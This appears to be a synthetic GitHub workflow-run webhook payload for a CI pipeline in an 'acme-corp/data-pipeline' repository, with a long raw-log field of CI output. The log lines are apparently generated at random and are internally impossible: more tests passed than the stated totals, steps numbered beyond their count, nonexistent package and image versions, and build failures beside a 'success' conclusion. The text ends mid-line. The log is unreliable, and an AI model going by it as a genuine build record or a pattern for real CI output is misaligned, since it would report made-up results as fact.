{
  "action": "completed",
  "workflow_run": {
    "id": 99,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-890",
    "head_sha": "3a5b21d72b5f3ed0e6c902cab5b2900b8f31d43d",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-17T12:46:02.965945Z",
    "updated_at": "2025-12-17T12:48:09.934499Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "bob"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: integration_tests ===\nMinifying app.js\nPulling image: alpine:18\n[12:46:02] INFO: Starting build process\nnpm install: added 31 packages\nArtifact uploaded: build.tar.gz (46MB)\nCache hit for key-6755\nyarn add: Done in 24.63s\nTest Suites: 48 passed, 46 total\n[12:46:02] DEBUG: Loading configuration\n[12:46:02] INFO: Request completed\nStep 18/20: Building\nSnapshots: 26 passed, 38 total\nStep 2/16: Testing\nInstalling webpack@1.20.3\n[12:46:02] DEBUG: Query executed in 5ms\nPulling image: node:3.11\nnpm install: resolved 361 packages\nStep 8/21: Deploying\n[12:46:02] INFO: Connecting to database\nCompiling components/handler.rs...\nArtifact downloaded: 33MB\nReady.\nBundling main.css\n[12:46:02] WARN: Deprecated API usage\n[12:46:02] INFO: Connecting to database\nCreating production build...\nStep 18/22: Running migrations\n[12:46:02] INFO: Request completed\nException: TypeError\n\u2713 Step 'setup' succeeded\nLoading...\nOptimizing 13 modules...\nOptimizing 53 modules...\n[12:46:02] WARN: Deprecated API usage\nSwitched to branch 'feature/task-903'\nUploading artifact 'coverage' (47 files)\nTransforming 391 files...\nVerifying...\npip install: Successfully installed eslint-2.17\nFinished.\nCompiling components/app.ts...\nnpm install: added 427 packages\nCache miss for key-4320\nCompleted.\nHEAD is now at ca32e7c\nCache saved successfully\nStep 2/18: Testing\nCache miss for key-3821\nFinished.\nnpm notice: created a lockfile\nWARNING: react has known vulnerabilities\n[12:46:02] DEBUG: Connection pool: 1 active\n\u2713 lint completed\n[12:46:02] DEBUG: Loading configuration\n\u2713 lint completed\nConnection established\n\u2713 Step 'test' succeeded\nChecking out main branch\nTests: 142 passed, 297 total\nGenerating source maps...\nConnection established\nDone.\nCache miss for key-3076\nFetching submodules...\nCompiling components/index.js...\nChecking out develop branch\nRan 30 tests in 46s\npip: Downloading webpack-5.17.tar.gz\nSnapshots: 44 passed, 7 total\nArtifact uploaded: dist.zip (70MB)\n[12:46:02] DEBUG: Query executed in 93ms\nPulling image: alpine:18\n[12:46:02] WARN: Deprecated API usage\nCompleted.\n[12:46:02] DEBUG: Query executed in 48ms\n[12:46:02] DEBUG: Query executed in 87ms\n[12:46:02] INFO: Starting build process\nFetching from https://amazonaws.com/package.json\nnpm notice: package.json updated\n[12:46:02] DEBUG: Loading configuration\nFAILED: test_auth_login\n[12:46:02] INFO: Request completed\nCompiling utils/main.py...\nTLS handshake completed\nReady.\nGET /api - 204 (49ms)\nUsing Node.js 14.20.4\n[12:46:02] DEBUG: Initializing service\nStep 1/17: Installing dependencies\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: webpack has known vulnerabilities\nStep 11/20: Installing dependencies\nTests: 141 passed, 142 total\nCache saved successfully\nTime: 81.267s\n[12:46:02] INFO: Processing request\nArtifact uploaded: dist.zip (2MB)\nPlatform: win32-x64\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (3MB)\nPlatform: linux-x64\nArtifact uploaded: build.tar.gz (16MB)\nFetching from https://googleapis.com/package.json\nStep 20/15: Running migrations\n[12:46:02] INFO: Request completed\n[12:46:02] INFO: Connecting to database\n\u2717 build failed with exit code 37\nLoading...\nTLS handshake completed\nGenerating source maps...\nChecking out develop branch\nStep 17/15: Running migrations\nUsing Node.js 15.4.3\nTests: 288 passed, 143 total\nGET /status - 200 (41ms)\nSnapshots: 17 passed, 43 total\nTests: 202 passed, 491 total\nReady.\n[12:46:02] ERROR: Connection failed\nInstalling prettier@5.15.10\nPOST /api - 201 (244ms)\n[12:46:02] WARN: Deprecated API usage\n[12:46:02] INFO: Connecting to database\nCache saved successfully\n[12:46:02] DEBUG: Memory usage: 939MB\nGET /status - 204 (11ms)\nChecking out master branch\nMinifying main.js\nCache invalidated: dependencies\nFetching from https://githubusercontent.com/package.json\nCache restored successfully (381MB)\nGET /status - 201 (85ms)\nTLS handshake completed\npip: Installing build dependencies...\nCache saved successfully\nNODE_ENV=production\nStep 6/21: Deploying\nTest Suites: 48 passed, 40 total\nTest Suites: 38 passed, 17 total\n\u2713 Task completed in 4691ms\nCompiling src/service.java...\n[12:46:02] INFO: Processing request\nFetching submodules...\nCreating production build...\nLayer 7/12: RUN command\nSuccess!\nSuccess!\n[12:46:02] INFO: Starting build process\npip: Collecting jest\nCompiling utils/handler.rs...\n[12:46:02] WARN: Deprecated API usage\n[12:46:02] INFO: Processing request\nStep 2/17: Deploying\nGenerating source maps...\nConnection established\n[12:46:02] INFO: Request completed\nLoading...\n=== Step integration_tests completed ===\n=== Step: deploy_staging ===\nCache restored successfully (441MB)\nStep 4/23: Testing\n[12:46:02] INFO: Cache refreshed\nHEAD is now at 4d97a4c\npip: Collecting webpack\nVerifying...\nOK\nCache invalidated: dependencies\nStep 2/23: Linting\nTests: 446 passed, 489 total\nCompiling lib/service.java...\nCompleted.\nPushing to registry...\nGET /health - 201 (42ms)\nSnapshots: 20 passed, 13 total\nCompiling components/app.ts...\npip install: Successfully installed eslint-2.19\nDone.\nPulling image: python:latest\nTest Suites: 45 passed, 37 total\n\u2713 deploy completed\nOK\nSwitched to branch 'bugfix/task-915'\nStep 10/17: Linting\nTransforming 468 files...\nRan 11 tests in 6s\nCompiling src/service.java...\nGET /status - 200 (1ms)\nDone.\nChecking out master branch\n[12:46:02] ERROR: Connection failed\nWARNING: webpack has known vulnerabilities\npip: Downloading react-4.5.tar.gz\nStep 10/21: Running migrations\n[12:46:02] INFO: Cache refreshed\nFetching submodules...\nAlready up to date.\n[12:46:02] WARN: Deprecated API usage\nWaiting...\npip install: Successfully installed axios-2.16\nTransforming 702 files...\n\u2713 test completed\nInstalling lodash@3.5.1\nFinished.\nUsing Python 3.11\npip: Installing build dependencies...\n[12:46:02] ERROR: Connection failed\n[12:46:02] DEBUG: Query executed in 87ms\nEnvironment: production\nTime: 104.445s\nFAILED: test_auth_login\nTime: 90.524s\nArtifact downloaded: 36MB\nUsing Node.js 19.15.1\nBundling vendor.js\nHEAD is now at f0708a2\nFinished.\nStep 7/15: Deploying\nGenerating source maps...\n[12:46:02] DEBUG: Initializing service\nImage pulled successfully\nyarn add: Done in 2.13s\n[12:46:02] INFO: Request completed\nNODE_ENV=development\nRan 162 tests in 21s\nSnapshots: 15 passed, 13 total\nArtifact uploaded: dist.zip (41MB)\nFAILED: test_api_health\n\u2713 lint completed\nStep 18/18: Building\nPushing to registry...\nCompiling lib/index.js...\nBuilding Docker image...\nBuilding Docker image...\nCache hit for key-2162\nPlatform: linux-x64\nStep 2/23: Running migrations\n  PASS: test_db_connect (72ms)\nFAILED: test_api_health\nStep 12/24: Deploying\nFetching from https://gcr.io/package.json\nOptimizing 40 modules...\nCompiling src/main.py...\n  PASS: unit/test_user_create.spec.js\nWARNING: prettier has known vulnerabilities\n\u2717 build failed with exit code 42\nTransforming 159 files...\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 18/22: Testing\n\u2717 build failed with exit code 78\nyarn add: Done in 12.88s\nFinished.\nRan 126 tests in 21s\nCompiling components/main.py...\nStep 11/21: Building\nyarn add: Done in 28.61s\n[12:46:02] DEBUG: Query executed in 72ms\nTime: 59.907s\nArtifact uploaded: build.tar.gz (26MB)\n[12:46:02] INFO: Starting build process\n[12:46:02] INFO: Cache refreshed\nPlatform: linux-x64\nCache saved successfully\n[12:46:02] WARN: Deprecated API usage\nnpm notice: created a lockfile\nCreating production build...\nWARNING: express has known vulnerabilities\nNODE_ENV=development\nnpm install: added 286 packages\nnpm notice: created a lockfile\nImage pulled successfully\nStep 12/16: Testing\nTransforming 627 files...\nFinished.\nFetching submodules...\nTests: 410 passed, 139 total\nCompiling lib/handler.rs...\nNODE_ENV=development\nFAILED: test_auth_login\nCreating production build...\nPlatform: win32-x64\nyarn add: Done in 9.53s\nGenerating source maps...\nTLS handshake completed\nEnvironment: test\n[12:46:02] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (39MB)\nFetching from https://gcr.io/package.json\nAlready up to date.\nnpm install: added 97 packages\n[12:46:02] DEBUG: Memory usage: 1811MB\nFinished.\nCreating production build...\nPOST /upload - 201 (78ms)\nCreating production build...\n[12:46:02] INFO: Processing request\nCompiling utils/app.ts...\nWARNING: react has known vulnerabilities\n[12:46:02] DEBUG: Query executed in 16ms\nLayer 1/10: ENV command\npip: Downloading axios-3.13.tar.gz\n[12:46:02] DEBUG: Memory usage: 1773MB\nException: TypeError\nSwitched to branch 'bugfix/task-532'\n  PASS: integration/test_user_create.spec.js\nStep 4/23: Linting\nStep 18/22: Deploying\nTime: 115.490s\nImage pulled successfully\nCompiling lib/index.js...\nnpm install: added 305 packages\nWARNING: jest has known vulnerabilities\nArtifact uploaded: build.tar.gz (36MB)\npip: Installing build dependencies...\nPOST /api - 202 (60ms)\nnpm notice: package.json updated\nSnapshots: 10 passed, 13 total\n=== Step deploy_staging completed ===\n=== Step: deploy_production ===\nCompiling components/app.ts...\nProcessing...\n[12:46:02] INFO: Processing request\n[12:46:02] INFO: Cache refreshed\nCompiling components/handler.rs...\nGenerating source maps...\npip: Installing build dependencies...\npip: Installing build dependencies...\n\u2713 validate completed\nWARNING: react has known vulnerabilities\nArtifact downloaded: 26MB\nHEAD is now at ca7b7ca\n[12:46:02] DEBUG: Connection pool: 8 active\nException: RuntimeError\nCompiling components/main.py...\n[12:46:02] WARN: Deprecated API usage\n[12:46:02] DEBUG: Initializing service\nInstalling express@4.14.6\nCompiling components/utils.go...\nGET /health - 200 (4ms)\nTLS handshake completed\nCache saved successfully\nnpm notice: created a lockfile\npip: Collecting react\nArtifact uploaded: build.tar.gz (17MB)\n[12:46:02] INFO: Request completed\nSuccess!\nMinifying main.js\n[12:46:02] DEBUG: Loading configuration\nStep 18/18: Running migrations\nVerifying...\nSuccess!\nInstalling react@4.13.5\nArtifact downloaded: 12MB\nArtifact downloaded: 38MB\nStep 14/22: Building\n  PASS: test_user_create (7ms)\nWaiting...\n[12:46:02] DEBUG: Connection pool: 6 active\nnpm notice: created a lockfile\nTest Suites: 18 passed, 40 total\n[12:46:02] INFO: Request completed\nnpm notice: package.json updated\nCompiling components/service.java...\n[12:46:02] INFO: Cache refreshed\nSuccess!\nWaiting...\nCache invalidated: node_modules\nSuccess!\n[12:46:02] DEBUG: Query executed in 56ms\nFAILED: test_db_connect\nCache miss for key-7362\n[12:46:02] DEBUG: Connection pool: 19 active\nPOST /api - 202 (97ms)\nArtifact downloaded: 3MB\n[12:46:02] DEBUG: Initializing service\n[12:46:02] DEBUG: Connection pool: 17 active\nProcessing...\nAlready up to date.\nConnection established\nUsing Python 3.10\n[12:46:02] INFO: Processing request\nTests: 413 passed, 354 total\nCoverage: 81% statements, 75% branches\nCompleted.\nCompleted.\nCompiling components/app.ts...\nTransforming 357 files...\nTest Suites: 38 passed, 34 total\nAlready up to date.\nOK\nImage pulled successfully\nAlready up to date.\n[12:46:02] DEBUG: Memory usage: 1255MB\n  PASS: test_user_create (265ms)\n[12:46:02] WARN: Deprecated API usage\nUploading artifact 'coverage' (27 files)\nPOST /upload - 201 (472ms)\nCache miss for key-4608\nTransforming 391 files...\nException: TypeError\nLayer 2/11: ENV command\nEnvironment: test\nReady.\nWARNING: axios has known vulnerabilities\nImage pulled successfully\nSuccess!\nStep 3/21: Building\nStep 16/23: Installing dependencies\nFinished.\nPushing to registry...\n[12:46:02] INFO: Processing request\nGET /health - 200 (37ms)\nInstalling jest@4.8.4\nTransforming 998 files...\n\u2713 Task completed in 3012ms\nReady.\n\u2713 All checks passed\nStep 18/21: Deploying\n\u2713 Task completed in 533ms\nInstalling prettier@3.16.6\nProcessing...\nTLS handshake completed\npip: Downloading jest-1.20.tar.gz\nCache hit for key-6310\nGET /api - 201 (42ms)\nInstalling lodash@1.2.9\n[12:46:02] DEBUG: Query executed in 76ms\nTLS handshake completed\n[12:46:02] DEBUG: Loading configuration\nBuilding Docker image...\nUsing Python 3.12\nStep 15/17: Running migrations\n[12:46:02] WARN: Deprecated API usage\nGenerating source maps...\nMinifying vendor.js\nStep 20/18: Deploying\npip: Downloading webpack-5.5.tar.gz\nStep 5/21: Deploying\nWARNING: express has known vulnerabilities\n[12:46:02] DEBUG: Initializing service\nStep 16/19: Deploying\nRan 29 tests in 23s\nHEAD is now at a62d7fa\n  PASS: unit/test_db_connect.spec.js\nUsing Node.js 19.16.6\n\u2713 Step 'install' succeeded\nDone.\nCache restored successfully (354MB)\nCompiling lib/service.java...\nException: ValueError\n[12:46:02] INFO: Cache refreshed\nStep 20/23: Building\nCache miss for key-1796\nBundling main.css\nArtifact uploaded: dist.zip (3MB)\nRan 165 tests in 56s\nnpm notice: created a lockfile\nCache invalidated: build\nLoading...\npip: Collecting react\n[12:46:02] WARN: Deprecated API usage\nDone.\nException: NullPointerException\nImage pulled successfully\nArtifact uploaded: dist.zip (7MB)\nMinifying app.js\nLoading...\npip: Collecting webpack\nMinifying main.js\nException: RuntimeError\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\nCoverage: 93% statements, 90% branches\nInstalling jest@3.1.5\nnpm install: added 435 packages\npip: Installing build dependencies...\nCache saved successfully\n=== Step deploy_production completed ===\n=== Step: upload_artifacts ===\nVerifying...\nPlatform: linux-x64\nStep 12/24: Building\n[12:46:03] INFO: Connecting to database\n[12:46:03] INFO: Request completed\nnpm notice: package.json updated\nTest Suites: 42 passed, 5 total\nnpm install: resolved 104 packages\nRan 66 tests in 4s\nProcessing...\nCompiling lib/main.py...\npip: Collecting eslint\n[12:46:03] INFO: Request completed\nnpm notice: created a lockfile\n[12:46:03] INFO: Starting build process\nArtifact uploaded: build.tar.gz (40MB)\nTLS handshake completed\nWARNING: jest has known vulnerabilities\nCompiling src/service.java...\n\u2713 deploy completed\nCache miss for key-8358\nWARNING: react has known vulnerabilities\nTime: 101.586s\nStep 4/24: Building\nEnvironment: development\nUsing Node.js 20.15.6\nnpm install: resolved 1861 packages\nArtifact uploaded: dist.zip (74MB)\nOK\nFetching from https://pypi.org/package.json\nCompleted.\nTime: 53.554s\nHEAD is now at e5cd6f1\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Python 3.11\nTransforming 679 files...\npip: Installing build dependencies...\nNODE_ENV=production\nWaiting...\nWARNING: webpack has known vulnerabilities\nVerifying...\nImage pulled successfully\nStep 13/19: Linting\nArtifact uploaded: build.tar.gz (25MB)\n[12:46:03] WARN: Deprecated API usage\nFAILED: test_cache_hit\nStep 9/18: Installing dependencies\nStep 8/20: Deploying\n  PASS: test_user_create (26ms)\nCache restored successfully (334MB)\n[12:46:03] INFO: Request completed\nUsing Node.js 14.1.0\nGenerating source maps...\nEnvironment: development\nCache invalidated: build\nnpm notice: package.json updated\nStep 18/19: Linting\nBuilding Docker image...\nDone.\n\u2713 Task completed in 2411ms\nGET /health - 200 (79ms)\n[12:46:03] INFO: Cache refreshed\nCompiling utils/index.js...\npip: Downloading prettier-2.2.tar.gz\nTests: 292 passed, 211 total\npip: Downloading react-2.14.tar.gz\npip: Installing build dependencies...\nFetching from https://docker.io/package.json\n[12:46:03] DEBUG: Loading configuration\n\u2717 build failed with exit code 40\n[12:46:03] INFO: Connecting to database\nSuccess!\nArtifact uploaded: dist.zip (44MB)\nWARNING: axios has known vulnerabilities\n\u2717 build failed with exit code 34\nConnection established\nFAILED: test_cache_hit\nWARNING: jest has known vulnerabilities\nFetching from https://npmjs.org/package.json\nArtifact uploaded: dist.zip (58MB)\nLoading...\nPushing to registry...\nnpm notice: package.json updated\nArtifact downloaded: 31MB\nTLS handshake completed\nGenerating source maps...\nVerifying...\npip: Installing build dependencies...\nBuilding Docker image...\nFinished.\nTime: 10.47s\n[12:46:03] DEBUG: Loading configuration\nEnvironment: production\nInstalling eslint@3.0.1\nPOST /data - 202 (347ms)\nFetching from https://amazonaws.com/package.json\n[12:46:03] INFO: Cache refreshed\nPushing to registry...\nPushing to registry...\nnpm notice: package.json updated\nCache saved successfully\nStep 5/17: Building\n\u2717 build failed with exit code 76\nCache invalidated: node_modules\nSnapshots: 1 passed, 32 total\nDone.\n\u2713 Task completed in 1650ms\nWARNING: jest has known vulnerabilities\nTransforming 274 files...\nSwitched to branch 'bugfix/task-756'\nCompiling utils/index.js...\nDone.\n[12:46:03] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Step 'test' succeeded\nyarn add: Done in 5.12s\nNODE_ENV=development\n  PASS: e2e/test_auth_login.spec.js\nAlready up to date.\n\u2713 build completed\nProcessing...\n[12:46:03] INFO: Request completed\nTLS handshake completed\nCompiling src/handler.rs...\nArtifact downloaded: 5MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling jest@5.15.6\npip install: Successfully installed lodash-1.16\nLoading...\n[12:46:03] INFO: Request completed\nCache miss for key-1005\nGenerating source maps...\npip: Downloading axios-1.7.tar.gz\n\u2717 build failed with exit code 108\nLayer 8/8: COPY command\nCompiling components/main.py...\nInstalling prettier@1.13.10\nCompiling src/main.py...\nnpm notice: created a lockfile\nTLS handshake completed\nStep 2/23: Testing\npip: Downloading axios-5.5.tar.gz\npip: Downloading jest-4.3.tar.gz\nSuccess!\nCompleted.\nStep 17/25: Linting\n\u2717 build failed with exit code 114\n  PASS: test_db_connect (251ms)\nProcessing...\nPulling image: alpine:latest\nStep 6/18: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:03] INFO: Request completed\nSwitched to branch 'hotfix/task-455'\nArtifact downloaded: 46MB\nArtifact uploaded: dist.zip (70MB)\nOK\n[12:46:03] DEBUG: Memory usage: 1030MB\n=== Step upload_artifacts completed ===\n=== Step: setup_environment ===\n[12:46:03] DEBUG: Connection pool: 17 active\nLoading...\npip: Installing build dependencies...\n[12:46:03] INFO: Cache refreshed\nBundling runtime.css\nnpm notice: package.json updated\nUsing Python 3.12\nLoading...\nTime: 16.54s\n[12:46:03] DEBUG: Connection pool: 19 active\nPushing to registry...\nCompiling src/handler.rs...\nGenerating source maps...\n[12:46:03] INFO: Request completed\npip: Installing build dependencies...\nConnection established\nTest Suites: 30 passed, 11 total\nnpm notice: package.json updated\npip: Collecting react\n[12:46:03] INFO: Connecting to database\nProcessing...\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOptimizing 17 modules...\nPlatform: linux-x64\nCache hit for key-8364\nWaiting...\n[12:46:03] DEBUG: Query executed in 4ms\nyarn add: Done in 14.13s\nWARNING: lodash has known vulnerabilities\n[12:46:03] ERROR: Connection failed\n[12:46:03] DEBUG: Connection pool: 10 active\nFetching from https://githubusercontent.com/package.json\nBundling runtime.js\nWARNING: express has known vulnerabilities\nCompiling lib/app.ts...\n[12:46:03] INFO: Connecting to database\nCache saved successfully\nWARNING: lodash has known vulnerabilities\nWARNING: axios has known vulnerabilities\nNODE_ENV=development\n[12:46:03] WARN: Deprecated API usage\nMinifying app.js\n\u2717 build failed with exit code 41\nnpm install: resolved 1513 packages\nnpm install: added 223 packages\nPulling image: alpine:3.11\npip install: Successfully installed express-2.12\nEnvironment: test\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling lib/handler.rs...\nTest Suites: 45 passed, 35 total\nPOST /api - 202 (231ms)\nEnvironment: test\n[12:46:03] DEBUG: Query executed in 40ms\npip: Collecting webpack\n[12:46:03] INFO: Cache refreshed\nImage pulled successfully\nArtifact uploaded: build.tar.gz (21MB)\npip install: Successfully installed lodash-3.9\n[12:46:03] DEBUG: Memory usage: 536MB\nCompiling src/app.ts...\nPlatform: linux-x64\nCompiling utils/index.js...\nCache hit for key-7207\nVerifying...\n[12:46:03] WARN: Deprecated API usage\nChecking out develop branch\nEnvironment: production\nArtifact uploaded: build.tar.gz (40MB)\nArtifact uploaded: dist.zip (77MB)\nArtifact downloaded: 3MB\nnpm install: added 29 packages\nCache hit for key-7658\nSnapshots: 39 passed, 43 total\n[12:46:03] INFO: Request completed\nRan 197 tests in 35s\nMinifying main.js\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGenerating source maps...\nSuccess!\nTime: 67.536s\nGenerating source maps...\nFinished.\nFAILED: test_db_connect\nnpm notice: package.json updated\nCompiling lib/main.py...\nUploading artifact 'coverage' (49 files)\nBuilding Docker image...\nFetching from https://googleapis.com/package.json\nTransforming 804 files...\n[12:46:03] DEBUG: Memory usage: 841MB\nPlatform: win32-x64\n  PASS: integration/test_user_create.spec.js\n[12:46:03] INFO: Cache refreshed\nWARNING: react has known vulnerabilities\nAlready up to date.\nGET /health - 201 (52ms)\nReady.\nnpm install: resolved 1085 packages\nInstalling lodash@2.6.4\nLoading...\nVerifying...\nStep 1/24: Linting\nLayer 2/9: COPY command\n[12:46:03] DEBUG: Loading configuration\npip: Downloading jest-4.11.tar.gz\nTime: 91.512s\nStep 7/23: Running migrations\nOptimizing 61 modules...\nTransforming 501 files...\nStep 12/19: Building\nProcessing...\nnpm notice: package.json updated\nCoverage: 87% statements, 85% branches\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/handler.rs...\nStep 16/20: Linting\nInstalling prettier@2.11.0\n[12:46:03] DEBUG: Memory usage: 1228MB\nBundling styles.css\nnpm install: resolved 1590 packages\nStep 1/18: Linting\nUsing Python 3.9\nCreating production build...\n[12:46:03] WARN: Deprecated API usage\n[12:46:03] INFO: Cache refreshed\nyarn add: Done in 18.88s\n[12:46:03] DEBUG: Loading configuration\n\u2713 deploy completed\n[12:46:03] INFO: Cache refreshed\nStep 10/19: Installing dependencies\nCompiling components/main.py...\n[12:46:03] INFO: Starting build process\n[12:46:03] DEBUG: Loading configuration\nRan 152 tests in 22s\nWARNING: prettier has known vulnerabilities\n  PASS: test_user_create (131ms)\nUploading artifact 'coverage' (13 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nAlready up to date.\nCache hit for key-5015\nArtifact downloaded: 12MB\nDone.\nRan 73 tests in 60s\nCoverage: 98% statements, 74% branches\npip: Installing build dependencies...\nStep 1/15: Running migrations\nRan 153 tests in 34s\nCompiling utils/service.java...\nNODE_ENV=development\nCompleted.\npip: Downloading express-1.20.tar.gz\n[12:46:03] DEBUG: Connection pool: 17 active\nCompleted.\n[12:46:03] DEBUG: Query executed in 12ms\nTLS handshake completed\n=== Step setup_environment completed ===\n=== Step: unit_tests ===\nConnection established\nMinifying main.js\nWaiting...\nBuilding Docker image...\nnpm notice: package.json updated\nCompiling lib/index.js...\n\u2713 Task completed in 3048ms\nImage pulled successfully\nyarn add: Done in 25.64s\nUsing Python 3.9\nTests: 173 passed, 362 total\n[12:46:03] DEBUG: Query executed in 35ms\n[12:46:03] INFO: Connecting to database\n[12:46:03] INFO: Request completed\nBundling styles.js\nSuccess!\nCache hit for key-1799\nCompleted.\n\u2713 Step 'checkout' succeeded\nCreating production build...\nArtifact uploaded: build.tar.gz (34MB)\nyarn add: Done in 22.60s\nUsing Node.js 18.12.1\nStep 7/19: Linting\nException: TypeError\nnpm install: resolved 662 packages\nTransforming 733 files...\nMinifying vendor.js\nHEAD is now at 701a3c1\nInstalling express@5.4.4\nDone.\n[12:46:03] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip install: Successfully installed webpack-3.5\n[12:46:03] INFO: Processing request\nCache miss for key-6375\nLoading...\n[12:46:03] DEBUG: Query executed in 90ms\n[12:46:03] INFO: Processing request\nArtifact downloaded: 30MB\n\u2713 Step 'build' succeeded\nGET /api - 200 (20ms)\nFinished.\n  PASS: test_user_create (48ms)\nCompiling utils/utils.go...\nGenerating source maps...\nCache miss for key-2973\n[12:46:03] INFO: Request completed\nReady.\n[12:46:03] INFO: Request completed\n\u2713 All checks passed\nCompiling src/app.ts...\n\u2713 Step 'install' succeeded\nStep 20/21: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying vendor.js\nnpm install: resolved 1641 packages\npip: Collecting eslint\nProcessing...\n\u2713 lint completed\n\u2713 All checks passed\n\u2717 build failed with exit code 94\nUploading artifact 'coverage' (20 files)\nAlready up to date.\nPushing to registry...\nStep 17/20: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGET /api - 201 (57ms)\nCache restored successfully (300MB)\n  PASS: test_db_connect (476ms)\nTime: 112.27s\nTime: 104.115s\nFinished.\nPOST /api - 200 (137ms)\nSwitched to branch 'hotfix/task-308'\nImage pulled successfully\nStep 15/15: Linting\nRan 43 tests in 59s\n\u2713 Task completed in 830ms\nStep 2/16: Installing dependencies\nWaiting...\nFinished.\n[12:46:03] DEBUG: Query executed in 46ms\n  PASS: test_cache_hit (376ms)\nCache hit for key-4287\nCompiling components/app.ts...\nCompleted.\n[12:46:03] DEBUG: Memory usage: 1958MB\nUploading artifact 'dist' (20 files)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache restored successfully (493MB)\n\u2713 Task completed in 2844ms\nBuilding Docker image...\n[12:46:03] DEBUG: Connection pool: 11 active\nAlready up to date.\nImage pulled successfully\nFinished.\n[12:46:03] INFO: Cache refreshed\n[12:46:03] DEBUG: Memory usage: 1372MB\nPulling image: alpine:3.11\n\u2713 test completed\nEnvironment: development\nCache invalidated: node_modules\n[12:46:03] DEBUG: Memory usage: 1958MB\nPulling image: python:latest\nFinished.\nOK\nMinifying main.js\n\u2713 All checks passed\nLoading...\nTests: 286 passed, 288 total\nLoading...\n[12:46:03] INFO: Starting build process\nnpm notice: created a lockfile\n[12:46:03] WARN: Deprecated API usage\nPushing to registry...\n[12:46:03] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (38MB)\nStep 13/15: Testing\nCompiling src/handler.rs...\nOK\nPlatform: win32-x64\nAlready up to date.\n\u2713 Task completed in 2785ms\nFetching from https://docker.io/package.json\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTest Suites: 33 passed, 19 total\nFetching submodules...\nException: TypeError\n[12:46:03] INFO: Starting build process\nArtifact downloaded: 37MB\nCompiling utils/utils.go...\nTests: 56 passed, 113 total\nFinished.\n  PASS: test_user_create (88ms)\n[12:46:03] WARN: Deprecated API usage\n[12:46:03] WARN: Deprecated API usage\nGenerating source maps...\nWaiting...\n\u2713 Step 'setup' succeeded\n[12:46:03] WARN: Deprecated API usage\nTests: 120 passed, 68 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:03] DEBUG: Query executed in 92ms\n[12:46:03] DEBUG: Loading configuration\nCompiling lib/service.java...\nCompleted.\nAlready up to date.\nStep 18/24: Installing dependencies\npip: Installing build dependencies...\nPulling image: alpine:latest\nyarn add: Done in 4.18s\n[12:46:03] WARN: Deprecated API usage\nWARNING: react has known vulnerabilities\n[12:46:03] INFO: Processing request\nGenerating source maps...\n[12:46:03] ERROR: Connection failed\n=== Step unit_tests completed ===\n=== Step: checkout ===\nCreating production build...\nTest Suites: 30 passed, 9 total\nCompiling src/handler.rs...\nNODE_ENV=test\nnpm install: resolved 881 packages\n\u2713 All checks passed\nStep 20/15: Testing\nVerifying...\nUploading artifact 'dist' (22 files)\n[12:46:03] DEBUG: Query executed in 95ms\nCache saved successfully\nProcessing...\nLayer 8/8: COPY command\nAlready up to date.\n[12:46:03] WARN: Deprecated API usage\nStep 4/18: Building\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/main.py...\nnpm notice: package.json updated\nTime: 117.851s\nyarn add: Done in 15.25s\n\u2713 Step 'build' succeeded\nStep 17/20: Installing dependencies\nCreating production build...\n\u2717 build failed with exit code 28\nStep 17/25: Deploying\n[12:46:03] INFO: Connecting to database\nCompiling lib/utils.go...\nTest Suites: 8 passed, 27 total\nHEAD is now at 333e9d1\nCreating production build...\nCache invalidated: build\n[12:46:03] DEBUG: Memory usage: 1842MB\nCompleted.\nCache miss for key-9402\nTransforming 357 files...\nTime: 99.209s\nStep 11/23: Testing\npip: Collecting webpack\npip: Installing build dependencies...\n\u2713 Task completed in 4798ms\n[12:46:03] WARN: Deprecated API usage\n[12:46:03] INFO: Processing request\nnpm install: added 94 packages\nCache hit for key-9604\nTLS handshake completed\nCompiling components/utils.go...\nUploading artifact 'build' (30 files)\n[12:46:03] DEBUG: Loading configuration\nTest Suites: 40 passed, 21 total\nProcessing...\nStep 8/15: Linting\nCompiling components/index.js...\nnpm notice: created a lockfile\npip: Collecting prettier\nInstalling prettier@2.20.6\nTime: 3.353s\nCreating production build...\nTime: 119.934s\nStep 6/24: Running migrations\nBundling runtime.js\nSuccess!\n  PASS: integration/test_auth_login.spec.js\nnpm install: resolved 912 packages\nWaiting...\nStep 10/25: Linting\nTLS handshake completed\nSwitched to branch 'feature/task-776'\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCreating production build...\n[12:46:03] DEBUG: Query executed in 82ms\n[12:46:03] DEBUG: Connection pool: 5 active\n[12:46:03] DEBUG: Query executed in 81ms\npip: Downloading jest-3.5.tar.gz\n[12:46:03] DEBUG: Memory usage: 168MB\nFetching from https://googleapis.com/package.json\nCoverage: 88% statements, 81% branches\nPushing to registry...\n\u2713 All checks passed\nLayer 1/11: RUN command\nStep 10/15: Linting\nArtifact downloaded: 30MB\nLoading...\nStep 3/23: Deploying\n\u2713 